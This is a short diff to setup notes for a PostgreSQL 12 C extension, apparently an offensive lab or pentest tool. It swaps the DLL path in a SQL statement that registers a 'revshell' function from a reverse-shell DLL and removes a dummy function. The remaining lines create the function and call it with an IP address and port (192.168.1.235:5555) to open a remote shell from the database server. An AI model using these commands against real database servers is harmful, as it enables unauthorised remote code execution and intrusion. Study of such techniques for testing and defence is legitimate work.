@@ -10,8 +10,7 @@ VS2019 Setup for postgres 12:
 
 
 Postgre UDF example, use with:
-CREATE OR REPLACE FUNCTION revshell(text, integer) RETURNS integer AS 'C:\reverse-shell-extension.dll','revshell' LANGUAGE C STRICT;
-CREATE OR REPLACE FUNCTION dummy_function(int) RETURNS int AS 'C:\psql-udf.dll','dummy_function' LANGUAGE C STRICT;
+CREATE OR REPLACE FUNCTION revshell(text, integer) RETURNS integer AS 'C:\revshell32.dll','revshell' LANGUAGE C STRICT;
 SELECT revshell('192.168.1.235', 5555);
 
 DEBUG:
